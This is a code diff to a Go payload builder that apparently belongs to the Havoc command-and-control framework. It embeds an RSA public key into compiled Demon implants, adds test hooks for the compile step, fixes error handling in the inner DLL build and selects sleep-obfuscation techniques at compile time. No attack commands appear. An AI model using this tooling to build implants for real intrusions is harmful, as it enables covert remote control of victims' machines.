@@ -135,6 +135,21 @@ type Builder struct {
 	outputPath string
 	preBytes   []byte
 
+	// [HVC-005 2026-03-28] BCRYPT_RSAPUBLIC_BLOB embedded as SERVER_PUBKEY_BLOB.
+	rsaPublicKeyBlob []byte
+
+	// testCmdRunner is non-nil only in tests.  When set, Cmd() delegates to it
+	// instead of exec.Command so tests can capture / fake the compile command
+	// without requiring a real cross-compiler.  The function receives the full
+	// shell command string and returns (success, stderr).
+	testCmdRunner func(cmd string) (bool, string)
+
+	// innerBuilderSetup is non-nil only in tests.  For FILETYPE_WINDOWS_RAW_BINARY
+	// the inner DLL builder is created inside Build(); this hook is called on that
+	// builder before its Build() runs, allowing tests to inject testCmdRunner and
+	// capture state (e.g. rsaPublicKeyBlob propagation).
+	innerBuilderSetup func(inner *Builder)
+
 	SendConsoleMessage func(MsgType, Message string)
 }
 
@@ -264,6 +279,20 @@ func (b *Builder) Build() bool {
 	//logger.Debug("array = " + array)
 
 	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_BYTES="+array)
+
+	// [HVC-005 2026-03-28] Embed the RSA-2048 public key blob as SERVER_PUBKEY_BLOB.
+	if len(b.rsaPublicKeyBlob) > 0 {
+		pubArray := "{"
+		for i, byt := range b.rsaPublicKeyBlob {
+			if i == len(b.rsaPublicKeyBlob)-1 {
+				pubArray += fmt.Sprintf("0x%02x", byt)
+			} else {
+				pubArray += fmt.Sprintf("0x%02x\\,", byt)
+			}
+		}
+		pubArray += "}"
+		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVER_PUBKEY_BLOB="+pubArray)
+	}
 
 	// enable sending debug entries over HTTP(S) to the teamserver
 	if b.compilerOptions.Config.SendLogs {
@@ -402,8 +431,16 @@ func (b *Builder) Build() bool {
 		} else {
 			DllPayload.SetExtension(".x86.dll")
 		}
+		// [HVC-005] Propagate the RSA public key blob so SERVER_PUBKEY_BLOB is
+		// defined when Demon.c is compiled inside the inner DLL build.  Without
+		// this, the compiler fails on the unconditional `UCHAR PubKeyBlob[] =
+		// SERVER_PUBKEY_BLOB;` line in DemonMetaData(), and Build() returns false.
+		DllPayload.SetRSAPublicKey(b.rsaPublicKeyBlob)
 		DllPayload.compilerOptions.Defines = append(DllPayload.compilerOptions.Defines, "SHELLCODE")
 
+		if b.innerBuilderSetup != nil {
+			b.innerBuilderSetup(DllPayload)
+		}
 		b.SendConsoleMessage("Info", "compiling core dll...")
 		if DllPayload.Build() {
 
@@ -440,7 +477,13 @@ func (b *Builder) Build() bool {
 
 			return true
 		}
-		break
+		// Inner DLL compilation failed.  Return false immediately — do NOT fall
+		// through to the outer CompileCmd call below.  The outer command lacks
+		// format-specific flags (-shared / -e DllMain), so the linker would try
+		// to build a Windows executable, pull in libmingw32.a, and fail with
+		// "undefined reference to WinMain" — a confusing symptom that hides the
+		// real error (the DLL compile failure printed above).
+		return false
 
 	}
 
@@ -504,6 +547,12 @@ func (b *Builder) SetOutputPath(path string) {
 
 func (b *Builder) SetExtension(ext string) {
 	b.FileExtenstion = ext
+}
+
+// SetRSAPublicKey stores the BCRYPT_RSAPUBLIC_BLOB that will be embedded into
+// the payload as the SERVER_PUBKEY_BLOB compiler define. [HVC-005 2026-03-28]
+func (b *Builder) SetRSAPublicKey(blob []byte) {
+	b.rsaPublicKeyBlob = blob
 }
 
 func (b *Builder) GetOutputPath() string {
@@ -724,6 +773,14 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 				b.SendConsoleMessage("Info", "no sleep obfuscation has been specified")
 			}
 			break
+		}
+
+		// compile-time technique selection: only include the chosen obfuscation code
+		switch val {
+		case "Foliage":
+			b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SLEEPOBF_USE_FOLIAGE")
+		case "Ekko", "Zilean":
+			b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SLEEPOBF_USE_TIMER")
 		}
 	} else {
 		return nil, errors.New("sleep Obfuscation technique is undefined")
@@ -1062,6 +1119,19 @@ func (b *Builder) GetPayloadBytes() []byte {
 }
 
 func (b *Builder) Cmd(cmd string) bool {
+	// In tests a fake runner is injected so we don't need the real cross-compiler.
+	if b.testCmdRunner != nil {
+		ok, errOut := b.testCmdRunner(cmd)
+		if !ok {
+			logger.Error("Couldn't compile implant (test runner): " + errOut)
+			if !b.silent {
+				b.SendConsoleMessage("Error", "couldn't compile implant: "+errOut)
+				b.SendConsoleMessage("Error", "compile output: "+errOut)
+			}
+		}
+		return ok
+	}
+
 	var (
 		Command = exec.Command("sh", "-c", cmd)
 		stdout  bytes.Buffer
